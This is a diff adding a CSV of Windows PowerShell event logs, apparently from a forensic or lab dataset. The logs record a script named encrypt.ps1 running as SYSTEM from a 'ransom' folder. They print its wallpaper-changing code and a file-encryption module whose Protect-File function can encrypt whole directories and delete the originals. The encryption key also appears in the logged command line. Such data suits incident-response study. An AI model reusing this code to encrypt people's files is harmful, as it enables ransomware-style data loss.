@@ -1,0 +1,2695 @@
+,@timestamp,agent.hostname,event.action,event.code,event.module,event.outcome,event.provider,event.sequence,event.type,file.directory,file.extension,file.name,file.path,file.path.text,group.domain,group.id,group.name,host.architecture,host.hostname,host.id,host.ip,host.mac,host.name,host.os.build,host.os.family,host.os.kernel,host.os.name,host.os.name.text,host.os.platform,host.os.type,host.os.version,log.level,message,powershell.command.invocation_details.name,powershell.command.invocation_details.related_command,powershell.command.invocation_details.type,powershell.command.invocation_details.value,powershell.command.name,powershell.command.type,powershell.command.value,powershell.engine.new_state,powershell.engine.previous_state,powershell.engine.version,powershell.file.script_block_id,powershell.file.script_block_text,powershell.id,powershell.pipeline_id,powershell.process.executable_version,powershell.provider.name,powershell.provider.new_state,powershell.runspace_id,powershell.sequence,powershell.total,process.args,process.args_count,process.command_line,process.command_line.text,process.entity_id,process.executable,process.executable.text,process.name,process.name.text,process.pid,process.title,process.title.text,related.ip,related.user,source.domain,source.ip,source.port,user.domain,user.effective.domain,user.effective.name,user.effective.name.text,user.id,user.name,user.name.text,user.target.domain,user.target.id,user.target.name,user.target.name.text,winlog.activity_id,winlog.api,winlog.channel,winlog.computer_name,winlog.event_data.AccountName,winlog.event_data.AlgorithmName,winlog.event_data.AuthenticationPackageName,winlog.event_data.Binary,winlog.event_data.CallerProcessId,winlog.event_data.CallerProcessName,winlog.event_data.Categories,winlog.event_data.ClientCreationTime,winlog.event_data.ClientProcessId,winlog.event_data.CountOfCredentialsReturned,winlog.event_data.CurrentBias,winlog.event_data.CurrentStratumNumber,winlog.event_data.CurrentTimeZoneID,winlog.event_data.DirtyPages,winlog.event_data.ElevatedToken,winlog.event_data.ExitReason,winlog.event_data.FirstRefresh,winlog.event_data.HandleId,winlog.event_data.HiveName,winlog.event_data.HiveNameLength,winlog.event_data.ImagePath,winlog.event_data.ImpersonationLevel,winlog.event_data.IpAddress,winlog.event_data.IpPort,winlog.event_data.KeyFilePath,winlog.event_data.KeyLength,winlog.event_data.KeyName,winlog.event_data.KeyType,winlog.event_data.KeysUpdated,winlog.event_data.LmPackageName,winlog.event_data.LogonGuid,winlog.event_data.LogonProcessName,winlog.event_data.LogonType,winlog.event_data.NewSd,winlog.event_data.NewSdSacl0,winlog.event_data.NewTime,winlog.event_data.ObjectName,winlog.event_data.ObjectServer,winlog.event_data.ObjectType,winlog.event_data.OldSd,winlog.event_data.OldTime,winlog.event_data.Operation,winlog.event_data.PreviousTime,winlog.event_data.PrivilegeList,winlog.event_data.ProcessCreationTime,winlog.event_data.ProcessID,winlog.event_data.ProcessId,winlog.event_data.ProcessName,winlog.event_data.ProductName,winlog.event_data.ProviderName,winlog.event_data.ReadOperation,winlog.event_data.Reason,winlog.event_data.RestrictedAdminMode,winlog.event_data.ReturnCode,winlog.event_data.ServiceName,winlog.event_data.ServiceType,winlog.event_data.StartType,winlog.event_data.SubjectDomainName,winlog.event_data.SubjectLogonId,winlog.event_data.SubjectUserName,winlog.event_data.SubjectUserSid,winlog.event_data.TSId,winlog.event_data.TargetDomainName,winlog.event_data.TargetInfo,winlog.event_data.TargetLinkedLogonId,winlog.event_data.TargetLogonGuid,winlog.event_data.TargetLogonId,winlog.event_data.TargetName,winlog.event_data.TargetOutboundDomainName,winlog.event_data.TargetOutboundUserName,winlog.event_data.TargetServerName,winlog.event_data.TargetSid,winlog.event_data.TargetUserName,winlog.event_data.TargetUserSid,winlog.event_data.TimeSource,winlog.event_data.TimeSourceRefId,winlog.event_data.TimeZoneInfoCacheUpdated,winlog.event_data.TransmittedServices,winlog.event_data.Type,winlog.event_data.UserSid,winlog.event_data.VirtualAccount,winlog.event_data.Workstation,winlog.event_data.errorCode,winlog.event_data.param1,winlog.event_data.param10,winlog.event_data.param11,winlog.event_data.param16,winlog.event_data.param17,winlog.event_data.param19,winlog.event_data.param2,winlog.event_data.param20,winlog.event_data.param21,winlog.event_data.param22,winlog.event_data.param23,winlog.event_data.param3,winlog.event_data.param4,winlog.event_data.param5,winlog.event_data.param6,winlog.event_data.param7,winlog.event_data.param8,winlog.event_data.param9,winlog.event_data.serviceGuid,winlog.event_data.updateGuid,winlog.event_data.updateRevisionNumber,winlog.event_data.updateTitle,winlog.event_id,winlog.logon.id,winlog.logon.type,winlog.opcode,winlog.process.pid,winlog.process.thread.id,winlog.provider_guid,winlog.provider_name,winlog.record_id,winlog.task,winlog.user.domain,winlog.user.identifier,winlog.user.name,winlog.user.type,winlog.user_data.RmSessionId,winlog.user_data.UTCStartTime,winlog.user_data.xml_name,winlog.version
+0,"Oct 25, 2022 @ 04:35:57.369",DESKTOP-32EH6N8,Engine Lifecycle,403,powershell,-,PowerShell,19,end,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=19
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=6a48ad1f-a337-4099-8934-c29e134d04a3
+	HostApplication=powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=
+	EngineVersion=5.1.19041.1237
+	RunspaceId=725da9ed-1097-4ef8-af57-8d25402ac907
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,Stopped,Available,5.1.19041.1237,-,-,-,-,5.1.19041.1237,-,-,725da9ed-1097-4ef8-af57-8d25402ac907,-,-,"powershell, .\encrypt.ps1, -key, B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=",4,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,6a48ad1f-a337-4099-8934-c29e134d04a3,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,403.0,-,-,Info,-,-,-,PowerShell,353.0,Engine Lifecycle,-,-,-,-,-,-,-,-
+1,"Oct 25, 2022 @ 04:35:57.009",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,17,info,-,-,-,-,-,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=17
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=6a48ad1f-a337-4099-8934-c29e134d04a3
+	HostApplication=powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=
+	EngineVersion=5.1.19041.1237
+	RunspaceId=725da9ed-1097-4ef8-af57-8d25402ac907
+	PipelineId=11
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,-,-,-,-,-,-,5.1.19041.1237,-,-,-,11,5.1.19041.1237,Certificate,Started,725da9ed-1097-4ef8-af57-8d25402ac907,-,-,"powershell, .\encrypt.ps1, -key, B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=",4,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,6a48ad1f-a337-4099-8934-c29e134d04a3,-,-,-,-,-,ConsoleHost,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600.0,-,-,Info,-,-,-,PowerShell,352.0,Provider Lifecycle,-,-,-,-,-,-,-,-
+2,"Oct 25, 2022 @ 04:35:55.555",DESKTOP-32EH6N8,Executing Pipeline,4103,powershell,-,Microsoft-Windows-PowerShell,16,info,C:\Users\zhongli\Downloads\ransom,ps1,encrypt.ps1,C:\Users\zhongli\Downloads\ransom\encrypt.ps1,C:\Users\zhongli\Downloads\ransom\encrypt.ps1,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"CommandInvocation(Add-Type): ""Add-Type""
+ParameterBinding(Add-Type): name=""TypeDefinition""; value=""using System.Runtime.InteropServices; 
+namespace Win32{ 
+    
+     public class Wallpaper{ 
+        [DllImport(""user32.dll"", CharSet=CharSet.Auto)] 
+         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
+         
+         public static void SetWallpaper(string thePath){ 
+            SystemParametersInfo(20,0,thePath,3); 
+         }
+    }
+ } ""
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.19041.1237
+        Host ID = 6a48ad1f-a337-4099-8934-c29e134d04a3
+        Host Application = powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=
+        Engine Version = 5.1.19041.1237
+        Runspace ID = 725da9ed-1097-4ef8-af57-8d25402ac907
+        Pipeline ID = 1
+        Command Name = Add-Type
+        Command Type = Cmdlet
+        Script Name = C:\Users\zhongli\Downloads\ransom\encrypt.ps1
+        Command Path = 
+        Sequence Number = 16
+        User = WORKGROUP\SYSTEM
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:","""TypeDefinition""","Add-Type, Add-Type","CommandInvocation, ParameterBinding","""Add-Type"", ""using System.Runtime.InteropServices; , namespace Win32{ ,     ,      public class Wallpaper{ ,         [DllImport(""user32.dll"", CharSet=CharSet.Auto)] ,          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; ,          ,          public static void SetWallpaper(string thePath){ ,             SystemParametersInfo(20,0,thePath,3); ,          },     },  } """,Add-Type,Cmdlet,-,-,-,5.1.19041.1237,-,-,Microsoft.PowerShell,1,5.1.19041.1237,-,-,725da9ed-1097-4ef8-af57-8d25402ac907,-,-,"powershell, .\encrypt.ps1, -key, B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=",4,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,6a48ad1f-a337-4099-8934-c29e134d04a3,-,-,-,-,-,ConsoleHost,ConsoleHost,-,SYSTEM,-,-,-,WORKGROUP,-,-,-,S-1-5-18,SYSTEM,SYSTEM,-,-,-,-,{96d05236-e7e2-0007-996e-d096e2e7d801},wineventlog,Microsoft-Windows-PowerShell/Operational,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,4103.0,-,-,To be used when operation is just executing a method,"5,032","10,568",{a0c1853b-5c40-4b15-8766-3cf1c58f985a},Microsoft-Windows-PowerShell,88.0,Executing Pipeline,NT AUTHORITY,S-1-5-18,SYSTEM,User,-,-,-,1
+3,"Oct 25, 2022 @ 04:35:55.549",DESKTOP-32EH6N8,Pipeline Execution Details,800,powershell,-,PowerShell,15,info,C:\Users\zhongli\Downloads\ransom,ps1,encrypt.ps1,C:\Users\zhongli\Downloads\ransom\encrypt.ps1,C:\Users\zhongli\Downloads\ransom\encrypt.ps1,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Pipeline execution details for command line: add-type $code 
+. 
+
+Context Information: 
+	DetailSequence=1
+	DetailTotal=1
+
+	SequenceNumber=15
+
+	UserId=WORKGROUP\SYSTEM
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.1237
+	HostId=6a48ad1f-a337-4099-8934-c29e134d04a3
+	HostApplication=powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=
+	EngineVersion=5.1.19041.1237
+	RunspaceId=725da9ed-1097-4ef8-af57-8d25402ac907
+	PipelineId=1
+	ScriptName=C:\Users\zhongli\Downloads\ransom\encrypt.ps1
+	CommandLine=add-type $code 
+ 
+
+Details: 
+CommandInvocation(Add-Type): ""Add-Type""
+ParameterBinding(Add-Type): name=""TypeDefinition""; value=""using System.Runtime.InteropServices; 
+namespace Win32{ 
+    
+     public class Wallpaper{ 
+        [DllImport(""user32.dll"", CharSet=CharSet.Auto)] 
+         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
+         
+         public static void SetWallpaper(string thePath){ 
+            SystemParametersInfo(20,0,thePath,3); 
+         }
+    }
+ } ""","""TypeDefinition""","Add-Type, Add-Type","CommandInvocation, ParameterBinding","""Add-Type"", ""using System.Runtime.InteropServices; , namespace Win32{ ,     ,      public class Wallpaper{ ,         [DllImport(""user32.dll"", CharSet=CharSet.Auto)] ,          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; ,          ,          public static void SetWallpaper(string thePath){ ,             SystemParametersInfo(20,0,thePath,3); ,          },     },  } """,-,-,add-type $code ,-,-,5.1.19041.1237,-,-,-,1,5.1.19041.1237,-,-,725da9ed-1097-4ef8-af57-8d25402ac907,1,1,"powershell, .\encrypt.ps1, -key, B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=",4,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,powershell .\encrypt.ps1 -key B5KyIru7em96jpU0l9cIkKPAOV0fs52khTlay13kp3P=,6a48ad1f-a337-4099-8934-c29e134d04a3,-,-,-,-,-,ConsoleHost,ConsoleHost,-,SYSTEM,-,-,-,WORKGROUP,-,-,-,-,SYSTEM,SYSTEM,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,800.0,-,-,Info,-,-,-,PowerShell,351.0,Pipeline Execution Details,-,-,-,-,-,-,-,-
+4,"Oct 25, 2022 @ 04:35:55.028",DESKTOP-32EH6N8,Execute a Remote Command,4104,powershell,-,Microsoft-Windows-PowerShell,-,info,C:\Users\zhongli\Downloads\ransom,psm1,FileCryptography.psm1,C:\Users\zhongli\Downloads\ransom\FileCryptography.psm1,C:\Users\zhongli\Downloads\ransom\FileCryptography.psm1,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,warning,"Creating Scriptblock text (1 of 1):
+function New-CryptographyKey()
+{
+<#
+.SYNOPSIS 
+Generates a random cryptography key.
+
+.DESCRIPTION
+Generates a random cryptography key based on the desired key size.
+
+.PARAMETER Algorithm
+Algorithm to generate key for.
+
+.PARAMETER KeySize
+Number of bits the generated key will have.
+
+.PARAMETER AsPlainText
+Returns a String instead of SecureString.
+
+.OUTPUTS
+System.Security.SecureString. New-CryptographyKey return the key as a SecureString by default.
+System.String. New-CryptographyKey will return the key in plain text as a string if the -AsPlainText parameter is specified.
+
+.EXAMPLE
+$key = New-CryptographyKey
+This example generates a random 256-bit AES key and stores it in the variable $key.
+
+.NOTES
+Author: Tyler Siegrist
+Date: 9/22/2017
+#>
+[CmdletBinding()]
+[OutputType([System.Security.SecureString])]
+[OutputType([String], ParameterSetName='PlainText')]
+Param(
+    [Parameter(Mandatory=$false, Position=1)]
+    [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]
+    [String]$Algorithm='AES',
+    [Parameter(Mandatory=$false, Position=2)]
+    [Int]$KeySize,
+    [Parameter(ParameterSetName='PlainText')]
+    [Switch]$AsPlainText
+)
+    Process
+    {
+        try
+        {
+            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)
+            if($PSBoundParameters.ContainsKey('KeySize')){
+                $Crypto.KeySize = $KeySize
+            }
+            $Crypto.GenerateKey()
+            if($AsPlainText)
+            {
+                return [System.Convert]::ToBase64String($Crypto.Key)
+            }
+            else
+            {
+                return [System.Convert]::ToBase64String($Crypto.Key) | ConvertTo-SecureString -AsPlainText -Force
+            }
+        }
+        catch
+        {
+            Write-Error $_
+        }
+        
+    }
+}
+
+Function Protect-File
+{
+<#
+.SYNOPSIS 
+Encrypts a file using a symmetrical algorithm.
+
+.DESCRIPTION
+Encrypts a file using a symmetrical algorithm.
+
+.PARAMETER FileName
+File(s) to be encrypted.
+
+.PARAMETER Key
+Cryptography key as a SecureString to be used for encryption.
+
+.PARAMETER KeyAsPlainText
+Cryptography key as a String to be used for encryption.
+
+.PARAMETER CipherMode
+Specifies the block cipher mode to use for encryption.
+
+.PARAMETER PaddingMode
+Specifies the type of padding to apply when the message data block is shorter than the full number of bytes needed for a cryptographic operation.
+
+.PARAMETER Suffix
+Suffix of the encrypted file to be removed.
+
+.PARAMETER RemoveSource
+Removes the source (decrypted) file after encrypting.
+
+.OUTPUTS
+System.IO.FileInfo. Protect-File will return FileInfo with the SourceFile, Algorithm, Key, CipherMode, and PaddingMode as added NoteProperties
+
+.EXAMPLE
+Protect-File 'C:\secrets.txt' $key
+This example encrypts C:\secrets.txt using the key stored in the variable $key. The encrypted file would have the default extension of '.AES' and the source (decrypted) file would not be removed.
+
+.EXAMPLE
+Protect-File 'C:\secrets.txt' -Algorithm DES -Suffix '.Encrypted' -RemoveSource
+This example encrypts C:\secrets.txt with a randomly generated DES key. The encrypted file would have an extension of '.Encrypted' and the source (decrypted) file would be removed.
+
+.EXAMPLE
+Get-ChildItem 'C:\Files' -Recurse | Protect-File -Algorithm AES -Key $key -RemoveSource
+This example encrypts all of the files under the C:\Files directory using the key stored in the variable $key. The encrypted files would have the default extension of '.AES' and the source (decrypted) files would be removed.
+
+.NOTES
+Author: Tyler Siegrist
+Date: 9/22/2017
+#>
+[CmdletBinding(DefaultParameterSetName='SecureString')]
+[OutputType([System.IO.FileInfo[]])]
+Param(
+    [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
+    [Alias('PSPath','LiteralPath')]
+    [string[]]$FileName,
+    [Parameter(Mandatory=$false, Position=2)]
+    [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]
+    [String]$Algorithm = 'AES',
+    [Parameter(Mandatory=$false, Position=3, ParameterSetName='SecureString')]
+    [System.Security.SecureString]$Key = (New-CryptographyKey -Algorithm $Algorithm),
+    [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')]
+    [String]$KeyAsPlainText,
+    [Parameter(Mandatory=$false, Position=4)]
+    [System.Security.Cryptography.CipherMode]$CipherMode,
+    [Parameter(Mandatory=$false, Position=5)]
+    [System.Security.Cryptography.PaddingMode]$PaddingMode,
+    [Parameter(Mandatory=$false, Position=6)]
+    [String]$Suffix = "".$Algorithm"",
+    [Parameter()]
+    [Switch]$RemoveSource
+)
+    Begin
+    {
+        #Configure cryptography
+        try
+        {
+            if($PSCmdlet.ParameterSetName -eq 'PlainText')
+            {
+                $Key = $KeyAsPlainText | ConvertTo-SecureString -AsPlainText -Force
+            }
+
+            #Decrypt cryptography Key from SecureString
+            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)
+            $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))
+
+            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)
+            if($PSBoundParameters.ContainsKey('CipherMode')){
+                $Crypto.Mode = $CipherMode
+            }
+            if($PSBoundParameters.ContainsKey('PaddingMode')){
+                $Crypto.Padding = $PaddingMode
+            }
+            $Crypto.KeySize = $EncryptionKey.Length*8
+            $Crypto.Key = $EncryptionKey
+        }
+        Catch
+        {
+            Write-Error $_ -ErrorAction Stop
+        }
+    }
+    Process
+    {
+        $Files = Get-Item -LiteralPath $FileName
+    
+        ForEach($File in $Files)
+        {
+            $DestinationFile = $File.FullName + $Suffix
+
+            Try
+            {
+                $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
+                $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)
+
+                #Write IV (initialization-vector) length & IV to encrypted file
+                $Crypto.GenerateIV()
+                $FileStreamWriter.Write([System.BitConverter]::GetBytes($Crypto.IV.Length), 0, 4)
+                $FileStreamWriter.Write($Crypto.IV, 0, $Crypto.IV.Length)
+
+                #Perform encryption
+                $Transform = $Crypto.CreateEncryptor()
+                $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)
+                $FileStreamReader.CopyTo($CryptoStream)
+    
+                #Close open files
+                $CryptoStream.FlushFinalBlock()
+                $CryptoStream.Close()
+                $FileStreamReader.Close()
+                $FileStreamWriter.Close()
+
+                #Delete unencrypted file
+                if($RemoveSource){Remove-Item -LiteralPath $File.FullName}
+
+                #Output ecrypted file
+                $result = Get-Item $DestinationFile
+                $result | Add-Member –MemberType NoteProperty –Name SourceFile –Value $File.FullName
+                $result | Add-Member –MemberType NoteProperty –Name Algorithm –Value $Algorithm
+                $result | Add-Member –MemberType NoteProperty –Name Key –Value $Key
+                $result | Add-Member –MemberType NoteProperty –Name CipherMode –Value $Crypto.Mode
+                $result | Add-Member –MemberType NoteProperty –Name PaddingMode –Value $Crypto.Padding
+                $result
+            }
+            Catch
+            {
+                Write-Error $_
+                If($FileStreamWriter)
+                {
+                    #Remove failed file
+                    $FileStreamWriter.Close()
+                    Remove-Item -LiteralPath $DestinationFile -Force
+                }
+                Continue
+            }
+            Finally
+            {
+                if($CryptoStream){$CryptoStream.Close()}
+                if($FileStreamReader){$FileStreamReader.Close()}
+                if($FileStreamWriter){$FileStreamWriter.Close()}
+            }
+        }
+    }
+}
+
+Function Unprotect-File
+{
+<#
+.SYNOPSIS 
+Decrypts a file encrypted with Protect-File.
+
+.DESCRIPTION
+Decrypts a file using a provided cryptography key.
+
+.PARAMETER FileName
+File(s) to be decrypted.
+
+.PARAMETER Key
+Cryptography key as a SecureString be used for decryption.
+
+.PARAMETER KeyAsPlainText
+Cryptography key as a String to be used for decryption.
+
+.PARAMETER CipherMode
+Specifies the block cipher mode that was used for encryption.
+
+.PARAMETER PaddingMode
+Specifies the type of padding that was applied when the message data block was shorter than the full number of bytes needed for a cryptographic operation.
+
+.PARAMETER Suffix
+Suffix of the encrypted file to be removed.
+
+.PARAMETER RemoveSource
+Removes the source (encrypted) file after decrypting.
+
+.OUTPUTS
+System.IO.FileInfo. Unprotect-File will return FileInfo with the SourceFile as an added NoteProperty
+
+.EXAMPLE
+Unprotect-File 'C:\secrets.txt.AES' $key
+This example decrypts C:\secrets.txt.AES using the key stored in the variable $key. The decrypted file would remove the default extension of '.AES' and the source (encrypted) file would not be removed.
+
+.EXAMPLE
+Unprotect-File 'C:\secrets.txt.Encrypted' -Algorithm DES -Key $key -Suffix '.Encrypted' -RemoveSource
+This example decrypts C:\secrets.txt.Encrypted using DES and the key stored in the variable $key. The decrypted file would remove the extension of '.Encrypted' and the source (encrypted) file would be removed.
+
+.EXAMPLE
+Get-ChildItem 'C:\Files' -Recurse | Unprotect-File -Algorithm AES -Key $key -RemoveSource
+This example decrypts all of the files under the C:\Files directory using the key stored in the variable $key. The decrypted files would remove the default extension of '.AES' and the source (encrypted) files would be removed.
+
+.NOTES
+Author: Tyler Siegrist
+Date: 9/22/2017
+#>
+[CmdletBinding(DefaultParameterSetName='SecureString')]
+[OutputType([System.IO.FileInfo[]])]
+Param(
+    [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
+    [Alias('PSPath','LiteralPath')]
+    [string[]]$FileName,
+    [Parameter(Mandatory=$false, Position=2, ValueFromPipelineByPropertyName=$true)]
+    [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]
+    [String]$Algorithm = 'AES',
+    [Parameter(Mandatory=$true, Position=3, ValueFromPipelineByPropertyName=$true, ParameterSetName='SecureString')]
+    [System.Security.SecureString]$Key,
+    [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')]
+    [String]$KeyAsPlainText,
+    [Parameter(Mandatory=$false, Position=4, ValueFromPipelineByPropertyName=$true)]
+    [System.Security.Cryptography.CipherMode]$CipherMode = 'CBC',
+    [Parameter(Mandatory=$false, Position=5, ValueFromPipelineByPropertyName=$true)]
+    [System.Security.Cryptography.PaddingMode]$PaddingMode = 'PKCS7',
+    [Parameter(Mandatory=$false, Position=6)]
+    [String]$Suffix, #Assigning default value in code due to it not processing "".$Algorithm"" properly when Algorithm is ValueFromPipelineByPropertyName
+    [Parameter()]
+    [Switch]$RemoveSource
+)
+    Process
+    {
+        #Configure cryptography
+        try
+        {
+            if($PSCmdlet.ParameterSetName -eq 'PlainText')
+            {
+                $Key = $KeyAsPlainText | ConvertTo-SecureString -AsPlainText -Force
+            }
+
+            #Decrypt cryptography Key from SecureString
+            $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)
+            $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))
+
+            $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)
+            $Crypto.Mode = $CipherMode
+            $Crypto.Padding = $PaddingMode
+            $Crypto.KeySize = $EncryptionKey.Length*8
+            $Crypto.Key = $EncryptionKey
+        }
+        Catch
+        {
+            Write-Error $_ -ErrorAction Stop
+        }
+
+        if(-not $PSBoundParameters.ContainsKey('Suffix'))
+        {
+            $Suffix = "".$Algorithm""
+        }
+
+        #Used to store successfully decrypted file names.
+        $Files = Get-Item -LiteralPath $FileName
+
+        ForEach($File in $Files)
+        {
+            #Verify file ends with supplied suffix
+            If(-not $File.Name.EndsWith($Suffix))
+            {
+                Write-Error ""$($File.FullName) does not have an extension of '$Suffix'.""
+                Continue
+            }
+
+            $DestinationFile = $File.FullName -replace ""$Suffix$""
+
+            Try
+            {
+                $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)
+                $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)
+
+                #Get IV from file
+                [Byte[]]$LenIV = New-Object Byte[] 4
+                $FileStreamReader.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
+                $FileStreamReader.Read($LenIV,  0, 3) | Out-Null
+                [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)
+                [Byte[]]$IV = New-Object Byte[] $LIV
